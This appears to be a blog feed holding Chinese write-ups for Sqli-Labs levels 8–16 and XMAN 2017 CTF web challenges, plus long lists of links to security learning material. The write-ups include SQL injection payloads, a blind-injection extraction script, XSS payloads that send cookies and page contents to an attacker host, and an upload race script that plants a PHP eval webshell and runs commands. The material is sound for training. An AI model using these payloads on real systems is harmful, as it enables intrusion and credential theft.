      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-15 POST- Blind-Boolian/time Based -Single quotesLess-16 POST- Blind-Boolian/time Based -Double quotes Less 15这关是盲注。没有回显。 payload：1uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit 之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。 Less 16payload：1uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit 登陆成功。 之后根据页面的登陆与否，构造逻辑语句利用脚本注入。 下面给个基于Less 16的脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://localhost:20000/sqllab/Less-16/index.php" data = "uname=" + payload + "&amp;passwd=chybeta&amp;submit=Submit" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; content = requests.post(url,data=data,headers=headers,proxies=proxy) return content.textflag = "flag.jpg"def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = 'admin") and%09(%09select%09ascii(substr(' +generateTarget(target) +"%09from%09"+ str(i) +"%09for%091))&lt;="+str(midNum) +")%23" recv = sendPayload(payload) if flag in recv: doubleSearch(leftNum,midNum,i,target) else: doubleSearch(midNum,rightNum,i,target) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less13~14-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less13-14-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-13 POST- Double Injection -Single quotes -String-with twistLess-14 POST- Double Injection -Single quotes -String-with twist Less 13当post数据为：1uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit 报错语句：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1 说明有括号保护，需闭合。 当post数据为：1uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit 页面返回提示说已经登陆成功。 后台查询语句为:1SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1 Less 14当post数据为：1uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1 当post数据为：1uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit 报错语句为:1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1 从以上几条语句知道，需要闭合双引号。 payload：1uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit 页面返回提示说已经登陆成功。 后台查询语句为：1SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less11~12-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less11-12-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-11 POST-Error Based -Single quotes- StringLess-12 POST - Error Based -Double quotes - String考察post注入，所以要借助工具。比如burp。 Less 11当post的数据如下时：1uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1 当post数据如下时：1uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1 用如下payload即可登陆成功：1uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit 这样后台的语句为:1SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1 Less 12和Less 11差不多，将单引号换成双引号。 post数据为：1uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit 报错语句为：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1 发现有括号保护。 最后的payload：1uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit 后台查询语句为：1SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less8~10-writeup]]></title>
      <url>%2F2017%2F08%2F23%2FSqli-Labs-Less8-10-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less-8 GET-Blind-Boolean Based- Single QuotesLess-9 GET-Time based - Single QuotesLess-10 GET-Blind-Time based - double quotes Less 8Less-8 GET-Blind-Boolean Based- Single Quotes访问：1http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23 发现有 字符串You are in........... 访问:1http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23 发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。比如以下payload：1234http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23 即可根据二分法得到数据库名称。 Less 9该关为GET-Time based - Single Quotes。基于时间的盲注访问:1http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23 1http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23 可以看到我们的sleep语句被带到了sql数据库中执行。 接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。1http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23 1http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23 之后利用脚本即可获取数据库名称。 Less 10Less-10 GET-Blind-Time based - double quotes这个跟Less 9一样，只是由单引号变为了双引号。 1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23 1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23 除了sleep，还有benchmark函数来进行时间盲注。 1BENCHMARK(count,expr) BENCHMARK()函数重复countTimes次执行表达式expr 访问：1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23 访问:1http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-XSS-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup%2F</url>
      <content type="text"><![CDATA[xss Task11http://202.112.51.217:33323/ Solution查看csp头：1&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot; 这里给出一个payload：1234567&lt;script&gt; var head = document.getElementsByTagName(&quot;head&quot;)[0] var n0t = document.createElement(&quot;link&quot;); n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;); n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie); head.appendChild(n0t);&lt;/script&gt; 得到flag：1xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125; Task21http://202.112.51.217:43425 Solution没有csp头。但没办法直接得到cookie。 另外有一个flag.php，访问后如下：1only admin can see the flag! 我们先控制admin访问flag.php，之后再发送数据到我们vps上。 payload：1234567&lt;script&gt; var xhr = new XMLHttpRequest(); xhr.open("GET", "http://202.112.51.217:43425/flag.php", false); xhr.send(); a=xhr.responseText; location.href="http://yourvps/?a="+escape(a);&lt;/script&gt; 得到flag：1xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125; 后记这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-比赛系统-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup%2F</url>
      <content type="text"><![CDATA[逻辑问题、任意用户密码重置 Task1http://202.112.51.217:8013 Solution有登陆和注册的功能，其中登陆处还有忘记密码。结合url：12http://202.112.51.217:8013/logic2_regist.phphttp://202.112.51.217:8013/logic2_login.php 猜测应该是逻辑问题。 我们注册一个账号 对我这个账号而言，其密保问题和答案均为chybeta 接下来看看登陆功能，用刚刚注册的账号登陆，得到提示：1普通用户登录成功,没什么用 那估计要登陆超级用户咯，比如admin。接下来用到忘记密码功能。 我们先输入用户名chybeta， 输入密保答案chybeta 抓包！ 可以看到有个username字段。我们猜测后端忘记密码的流程是这样的，先从数据库中抽取与用户名相对应的密保问题与答案，之后只要判断我们输入的答案是否和密保答案是否一致即可修改密码，而没有再一次的检查用户名。所以可能存在任意用户密码重置漏洞。 修改username为admin，然后forward掉。然后就可以重置admin的密码了。 重置后登陆得到；1FLAG&#123;You_Kookokoko_logic_OK&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN夏令营-2017-babyweb-writeup]]></title>
      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup%2F</url>
      <content type="text"><![CDATA[文件上传、php伪协议、文件包含 Task题目1http://202.112.51.217:8199 Solution一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：12http://202.112.51.217:8199/index.php?page=submithttp://202.112.51.217:8199/index.php?page=view 在submit处有上传功能，对应的页面是upload.php。 猜测有包含漏洞，用php伪协议读取源码，其余类似：1http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload upload.php:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php$error=$_FILES['pic']['error'];$tmpName=$_FILES['pic']['tmp_name'];$name=$_FILES['pic']['name'];$size=$_FILES['pic']['size'];$type=$_FILES['pic']['type'];try&#123; if($name!=="") &#123; $name1=substr($name,-4); if(($name1!==".gif") and ($name1!==".jpg")) &#123; echo "hehe"; echo "&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"; exit; &#125; if($type!=="image/jpeg"&amp;&amp;$type!=="image/gif") &#123; //echo mime_content_type($tmpName); echo "&lt;script language=javascript&gt;alert('不允许的文件类型！');history.go(-1)&lt;/script&gt;"; exit; &#125; if(is_uploaded_file($tmpName))&#123; $time=time(); $rootpath='uploads/'.$time.$name1; if(!move_uploaded_file($tmpName,$rootpath))&#123; echo "&lt;script language='JavaScript'&gt;alert('文件移动失败!');window.location='index.php?page=submit'&lt;/script&gt;"; exit; &#125; else&#123; sleep(2); if ($type=='image/jpeg') &#123; $im = @imagecreatefromjpeg($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, "Error loading image", $text_color); &#125; else &#123; $time=time(); $new_rootpath='uploads/'.$time.$name1; imagejpeg($im,$new_rootpath); imagedestroy($im); &#125; &#125; else if ($type=='image/gif') &#123; $im = @imagecreatefromgif($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, "Error loading image", $text_color); &#125; else &#123; $time=time(); $new_rootpath='uploads/'.$time.$name1; imagegif($im,$new_rootpath); imagedestroy($im); &#125; &#125; unlink($rootpath); &#125; &#125; echo "图片ID：".$time; &#125;&#125;catch(Exception $e)&#123; echo "ERROR";&#125;?&gt; index.php:1234567891011121314&lt;?php require("header.php"); $page=""; if (isset($_GET['page'])) &#123; $page=strtolower($_GET['page']); $page=str_replace("#", "", $page); $page=str_replace("'", "", $page); $page=$page.".php"; &#125; else $page="main.php"; include($page);?&gt; 在upload.php中，它先将我们上传的文件保存到uploads文件夹下，然后sleep(2)，接着调用imagecreatefromgif等一系列操作。如果我们上传一个包含php代码的图片木马，在经过imagecreatefromgif等一系列操作后，正常情况下其中的php代码会被去掉，也就是说操作过后的图片已经不是图片木马了。不过由于存在sleep(2)，可以利用这个两秒的空隙，利用phar或者zip协议去包含我们上传的还未被删除的图片木马。 基本的流程如下。首先有个k.php，内容如下:1&lt;?php @eval($_POST[&apos;test&apos;]) ?&gt; 将它压缩为zip文件，文件名为k.zip。 然后上传时将其文件名改为k.jpg，类型改为image/jpeg。在上传后访问http://202.112.51.217:8199/uploads/，去获取最新的文件名，然后用协议去包含。如果手动的话时间肯定会超过2s，所以需要用脚本。 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport timeimport threadingimport res = requests.session()def uploadfile(): url = 'http://202.112.51.217:8199/upload.php' data = &#123;'title':'1','url':'1'&#125; files = &#123;'pic': ('k.jpg', open('k.zip', 'rb'), 'image/jpeg', &#123;'Expires': '0'&#125;)&#125; html = s.post(url,files=files)// get the latest filenamedef getfilename(): url = 'http://202.112.51.217:8199/uploads/' content = s.get(url).content reg = r'href="(.+?\.jpg)"' imgre = re.compile(reg) imglist = re.findall(imgre,content) return imglist[::-1] // use phar getshelldef getshell(): filename = getfilename() for i in filename: url = 'http://202.112.51.217:8199/index.php?page=phar://uploads/' + i +'/k' data = &#123;'test':'system("ls");'&#125; content = s.post(url,data=data).content if 'flag' in content: print content exit()for i in range(10): t1 = threading.Thread(target=uploadfile) t2 = threading.Thread(target=getshell) t1.start() t2.start() 之后将getshell里的改为：123data = &#123;&apos;test&apos;:&apos;system(&quot;cat xxxxxxxxxasdasf_flag.php&quot;);&apos;&#125;content = s.post(url,data=data).contentif &apos;&#123;&apos; in content: 因为index.php中对#进行了过滤，所以zip协议用不了。因为zip协议的利用要如下：1http://202.112.51.217:8199/index.php?page=phar://uploads/filename.jpg#k Refference zip或phar协议包含文件 文件包含漏洞小结 PHP伪协议分析与应用 挖洞姿势：特殊的上传技巧，绕过PHP图片转换实现远程代码执行（RCE）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Software-Security-Learning]]></title>
      <url>%2F2017%2F08%2F19%2FSoftware-Security-Learning%2F</url>
      <content type="text"><![CDATA[Software-Security-Learning 学习资料8月31日更新小记： 新收录文章： Android Security： 初探 Android SO 开发 Bin Securiy 软件安全工程师技能表 Tools Angr：The next-generation binary analysis platform Angr：一个具有动态符号执行和静态分析的二进制分析工具 angr初探 Vuzzer自动漏洞挖掘工具简单分析附使用介绍 PEDA - Python Exploit Development Assistance for GDB pwntools - CTF framework and exploit development library Course Modern Binary Exploitation Linux (x86) Exploit Development Series liveoverflow: Binary Hacking Course Lots of Tutorials Hack The Virtual Memory Hack The Virtual Memory: C strings &amp; /proc Hack The Virtual Memory: Python bytes Hack the Virtual Memory: drawing the VM diagram Hack the Virtual Memory: malloc, the heap &amp; the program break Exploit writing tutorial Stack Based Overflows Stack Based Overflows – jumping to shellcode SEH Based Exploits SEH Based Exploits – just another example From Exploit to Metasploit – The basics How debugger modules &amp; plugins can speed up basic exploit development Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR Unicode – from 0x00410041 to calc Win32 Egg Hunting Introduction to Win32 shellcoding Chaining DEP with ROP Heap Spraying Demystified 基础知识 Linux中的GOT和PLT到底是个啥？ 关于符号执行 ROP一步一步ROP 一步一步学ROP之linux_x86篇 一步一步学ROP之linux_x86篇 一步一步学ROP之gadgets和2free篇 一步一步学ROP之Android ARM 32位篇 基本ROP ropasaurusrex: a primer on return-oriented programming2 ROP技术入门教程 二进制漏洞利用中的ROP技术研究与实例分析 现代栈溢出利用技术基础：ROP 通过ELF动态装载构造ROP链 Swing: 基础栈溢出复习 二 之 ROP BROP Blind Return Oriented Programming muhe: Have fun with Blind ROP Swing: 基础栈溢出复习 四 之 BROP SROP Sigreturn Oriented Programming (SROP) Attack攻击原理 Swing: 基础栈溢出复习 三 之 SROP Return-to-dl-resolve 通过ELF动态装载构造ROP链 （ Return-to-dl-resolve） 栈漏洞 手把手教你栈溢出从入门到放弃（上） 手把手教你栈溢出从入门到放弃（下） Hcamael: PWN学习总结之基础栈溢出 Hcamael: PWN学习总结之基础栈溢出2 Swing: 基础栈溢出复习 之基础 ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用 64-bit Linux stack smashing tutorial: Part 1 64-bit Linux stack smashing tutorial: Part 2 64-bit Linux stack smashing tutorial: Part 3 Offset2lib: bypassing full ASLR on 64bit Linu 堆漏洞 Heap Exploitation how2heap 堆相关知识 PWN之堆内存管理 Linux堆内存管理深入分析（上） Linux堆内存管理深入分析（下） Windows Exploit开发系列教程——堆喷射（一） Windows Exploit开发系列教程——堆喷射（二） Libc堆管理机制及漏洞利用技术 (一） Notes About Heap Overflow Under Linux 如何理解堆和堆溢出漏洞的利用? Have fun with glibc内存管理 内存映射mmap glibc malloc学习笔记之fastbin malloc.c源码阅读之__libc_free 堆利用技术 溢出科普：heap overflow&amp;溢出保护和绕过 现代化的堆相关漏洞利用技巧 从一字节溢出到任意代码执行-Linux下堆漏洞利用 Heap overflow using unlink Linux堆溢出漏洞利用之unlink Linux堆溢出之Fastbin Attack实例详解 unsorted bin attack分析 Double Free浅析 Understanding the heap by breaking it An Introduction to Use After Free Vulnerabilities Use After Free漏洞浅析 Linux堆漏洞之Use after free实例 堆之House of Spirit 格式化字符串漏洞 Exploiting Format String Vulnerabilities 二进制漏洞之——邪恶的printf 漏洞挖掘基础之格式化字符串 格式化字符串漏洞利用小结（一） 格式化字符串漏洞利用小结（二） Linux下的格式化字符串漏洞利用姿势 Linux系统下格式化字符串利用研究 Advances in format string exploitation Exploiting Sudo format string vunerability 其余漏洞FSP溢出 Head First FILE Stream Pointer Overflow abusing the FILE structure File Stream Pointer Overflows Paper. 溢出利用FILE结构体 整数溢出 整数溢出漏洞 保护绕过Cannary绕过 栈溢出之绕过CANARY保护 论canary的几种玩法 Liunx下关于绕过cancry保护总结 内核 HackSysExtremeVulnerableDriver Starting with Windows Kernel Exploitation – part 1 – setting up the lab Starting with Windows Kernel Exploitation – part 2 – getting familiar with HackSys Extreme Vulnerable Driver Windows内核利用之旅：熟悉HEVD（附视频演示） Windows 内核攻击：栈溢出 Linux 内核漏洞利用教程（一）：环境配置 Linux 内核漏洞利用教程（二）：两个Demo Linux 内核漏洞利用教程（三）：实践 CSAW CTF 题目 Linux内核ROP姿势详解(一) Linux内核ROP姿势详解（二） 虚拟机逃逸 虚拟机逃逸——QEMU的案例分析（一） 虚拟机逃逸——QEMU的案例分析（二） 虚拟机逃逸——QEMU的案例分析（三） ARM ARM 汇编基础速成1：ARM汇编以及汇编语言基础介绍 ARM 汇编基础速成2：ARM汇编中的数据类型 ARM 汇编基础速成3：ARM模式与THUMB模式 ARM 汇编基础速成4：ARM汇编内存访问相关指令 ARM 汇编基础速成5：连续存取 ARM 汇编基础速成6：条件执行与分支 ARM 汇编基础速成7：栈与函数 进程注入 10种常见的进程注入技术的总结 系统安全攻防战：DLL注入技术详解 漏洞挖掘 看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞 CTF中的pwn pwn &amp; exploit 入门 跟我入坑PWN第一章 跟我入坑PWN第二章 技巧 借助DynELF实现无libc的漏洞利用小结 what DynELF does basically Finding Function’s Load Address 总结 CTF总结 pwn tips CTF-pwn-tips pwn 学习总结 CTF中做Linux下漏洞利用的一些心得 linux常见漏洞利用技术实践 WP 堆溢出学习之0CTF 2017 Babyheap 一道有趣的CTF PWN题 Exploit-Exercises Nebula全攻略 三个白帽之从pwn me调试到Linux攻防学习 Android SecurityExercise DIVA Android Android安全项目入门篇 Skill 初探 Android SO 开发 Android App漏洞学习（一） Android App漏洞学习（二） WIKI: Android Android组件安全 通过 WebView 攻击 Android 应用 Tool 走到哪黑到哪——Android渗透测试三板斧 Brida:将frida与burp结合进行移动app渗透测试 浏览器安全 浏览器漏洞挖掘思路 IOS/OSX Securiy OSX/iOS reverse engineering IOSExercise Damn Vulnerable iOS Application (DVIA) Skill IosHackStudy Papers, Slides and Thesis Archive : iOS ios-wiki: iOS Security apple官方文档：iOS Security iOS安全系列汇总 浅谈iOS应用安全自动化审计 iOS安全审计入门 iOS内核漏洞挖掘–fuzz&amp;代码审计 OSXExercise OS X : Crackmes Skill Papers, Slides and Thesis Archive : Mac OS X]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web-Security-Learning]]></title>
      <url>%2F2017%2F08%2F19%2FWeb-Security-Learning%2F</url>
      <content type="text"><![CDATA[Web-Security-Learning 学习资料8月31日更新： 新增java-web代码审计模块 整合php代码审计模块 新收录文章： 前端安全； XSS 先知XSS挑战赛 - L3m0n Writeup 利用XSS和CSRF漏洞远程实现PayPal合作方网站未授权账户访问 CSRF: 浅谈Session机制及CSRF攻防 Exploiting JSON Cross Site Request Forgery (CSRF) using Flash 其他： safari本地文件读取漏洞之扩展攻击面 利用脚本注入漏洞攻击ReactJS应用程序 SSTI； Jinja2 template injection filter bypasses XXE: XXE-DTD Cheat Sheet 信息搜集： 乙方渗透测试之信息收集 Web-Security-Learning项目地址：Web-Security-Learning Web Securitysql注入MySql MySQL False注入及技巧总结 MySQL 注入攻击与防御 sql注入学习总结 SQL注入防御与绕过的几种姿势 MySQL偏门技巧 mysql注入可报错时爆表名、字段名、库名 高级SQL注入:混淆和绕过 MSSQL MSSQL DBA权限获取WEBSHELL的过程 MSSQL 注入攻击与防御 CLR在SQL Server中的利用技术分析 PostgreSQL postgresql数据库利用方式 PostgreSQL渗透测试指南 MongoDB MongoDB安全 – PHP注入检测 技巧 我的WafBypass之道（SQL注入篇） Bypass 360主机卫士SQL注入防御 SQL注入之骚姿势小记 CTF比赛中SQL注入的一些经验总结 如何绕过WAF/NGWAF的libinjection实现SQL注入 HackMe-SQL-Injection-Challenges 绕过WAF注入 bypassGET和POST的注入防御思路分享 SQL注入的常规思路及奇葩技巧 Beyond SQLi: Obfuscate and Bypass 工具 使用burp macros和sqlmap绕过csrf防护进行sql注入 sqlmap 使用总结 SQLmap tamper脚本注释 通过Burp以及自定义的Sqlmap Tamper进行二次SQL注入 前端安全XSS 漫谈同源策略攻防 再谈同源策略 跨域方法总结 浅谈跨站脚本攻击与防御 跨站的艺术-XSS入门与介绍 Content Security Policy 入门教程 LoRexxar-CSP XSS小记 DOMXSS Wiki XSS Bypass Cookbook 从瑞士军刀到变形金刚—XSS攻击面拓展 我们要在任何可能的地方测试XSS漏洞 Alternative to Javascript Pseudo-Protocol Bypassing CSP using polyglot JPEGs Bypass unsafe-inline mode CSP Chrome XSS Auditor – SVG Bypass Cross site scripting payload for fuzzing 不常见的xss利用探索 XSS攻击另类玩法 XSS易容术—-bypass之编码混淆篇+辅助脚本编写 Xssing Web With Unicodes Chrome 是怎么过滤反射型 XSS 的呢？ XSS Tricks - 从 Self-XSS 到登录你的账户 Electron hack —— 跨平台 XSS XSS without HTML: Client-Side Template Injection with AngularJS 一个URL跳转引发的一系列“惨案” 利用反射型XSS二次注入绕过CSP form-action限制 看我如何挖到GoogleMaps XSS漏洞并获得5000刀赏金 利用XSS和CSRF漏洞远程实现PayPal合作方网站未授权账户访问 Modern Alchemy: Turning XSS into RCE 先知XSS挑战赛 - L3m0n Writeup CSRF CRLF Injection and Bypass Tencent WAF 用代码来细说Csrf漏洞危害以及防御 Cookie-Form型CSRF防御机制的不足与反思 关于JSON CSRF的一些思考 Exploiting JSON Cross Site Request Forgery (CSRF) using Flash 浅谈Session机制及CSRF攻防 其他 safari本地文件读取漏洞之扩展攻击面 利用脚本注入漏洞攻击ReactJS应用程序 当代 Web 的 JSON 劫持技巧 SSRF Build Your SSRF Exploit Framework SSRF SSRF攻击实例解析 SSRF漏洞分析与利用 SSRF漏洞的挖掘经验 SSRF漏洞的利用与学习 SSRF漏洞中绕过IP限制的几种方法总结 利用ssrf漏洞获取google内部的dns信息 What is Server Side Request Forgery (SSRF)? DNS Rebinding技术绕过SSRF/代理IP限制 Discuz ssrf漏洞利用的几个python脚本 Discuz X系列门户文章功能SSRF漏洞挖掘与分析 SSRF to GET SHELL SSRF Tips XXE 浅谈XXE漏洞攻击与防御 XXE漏洞分析 XML实体注入漏洞攻与防 XML实体注入漏洞的利用与学习 XXE注入:攻击与防御 - XXE Injection: Attack and Prevent XXE (XML External Entity Injection) 漏洞实践 黑夜的猎杀-盲打XXE Hunting in the Dark - Blind XXE XMLExternal Entity漏洞培训模块 如何挖掘Uber网站的XXE注入漏洞 XXE被提起时我们会想到什么 XXE漏洞的简单理解和测试 XXE漏洞攻防之我见 XXE漏洞利用的一些技巧 神奇的Content-Type——在JSON中玩转XXE攻击 XXE-DTD Cheat Sheet JSONP注入 JSONP注入解析 JSONP 安全攻防技术 一次关于JSONP的小实验与总结 利用JSONP跨域获取信息 关于跨域和jsonp的一些理解(新手向) SSTI Jinja2 template injection filter bypasses 乱弹Flask注入 服务端模板注入攻击 （SSTI）之浅析 Exploring SSTI in Flask/Jinja2 Flask Jinja2开发中遇到的的服务端注入问题研究 FlaskJinja2 开发中遇到的的服务端注入问题研究 II Exploring SSTI in Flask/Jinja2, Part II Injecting Flask Server-Side Template Injection: RCE for the modern webapp Exploiting Python Code Injection in Web Applications 利用 Python 特性在 Jinja2 模板中执行任意代码 Python 模板字符串与模板注入 代码执行 PHP Code Injection Analysis 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 Hack PHP mail additional_parameters 详细解析PHP mail()函数漏洞利用技巧 在PHP应用程序开发中不正当使用mail()函数引发的血案 BigTree CMS - Bypass CSRF filter and execute code with PHPMailer 基于时间反馈的RCE 正则表达式使用不当引发的系统命令执行漏洞 文件包含 Turning LFI into RFI PHP文件包含漏洞总结 常见文件包含发生场景与防御 基于云端的本地文件包含漏洞 zip或phar协议包含文件 文件包含漏洞 一 文件包含漏洞 二 文件上传 / 解析漏洞 我的WafBypass之道（upload篇） 文件上传漏洞（绕过姿势） 服务器解析漏洞 文件上传总结 文件上传绕过姿势总结 尽最大可能分析上传源码及漏洞利用方式 从XSSer的角度测试上传文件功能 代码审计之逻辑上传漏洞挖掘 渗透测试方法论之文件上传 逻辑漏洞 代码审计之逻辑上传漏洞挖掘 逻辑至上——内含各种酷炫姿势 Web安全测试中常见逻辑漏洞解析（实战篇） 逻辑漏洞之密码重置 逻辑漏洞之支付漏洞 逻辑漏洞之越权访问 密码找回逻辑漏洞总结 一些常见的重置密码漏洞分析整理 密码逻辑漏洞小总结 漏洞挖掘之逻辑漏洞挖掘 tom0li: 逻辑漏洞小结 其他漏洞 Web之困笔记 常见Web源码泄露总结 Github信息泄露升级版案例 Hacking iSCSI RPO(relative path overwrite) 初探 Relative Path Overwrite Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities RPO A few RPO exploitation techniques Web Cache 浅析 Web Cache 欺骗攻击 redis 利用redis写webshell Redis 未授权访问配合 SSH key 文件利用分析 redis未授权访问漏洞利用总结。 PHP相关弱类型 从弱类型利用以及对象注入到SQL注入 PHP中“＝＝”运算符的安全问题 PHP弱类型安全问题总结 浅谈PHP弱类型安全 php比较操作符的安全问题 随机数问题 Cracking PHP rand() php里的随机数 php_mt_seed - PHP mt_rand() seed cracker The GLIBC random number generator 一道伪随机数的CTF题 伪协议 谈一谈php://filter的妙用 php 伪协议 利用 Gopher 协议拓展攻击面 PHP伪协议之 Phar 协议（绕过包含） PHP伪协议分析与应用 LFI、RFI、PHP封装协议安全问题学习 序列化 PHP反序列化漏洞 浅谈php反序列化漏洞 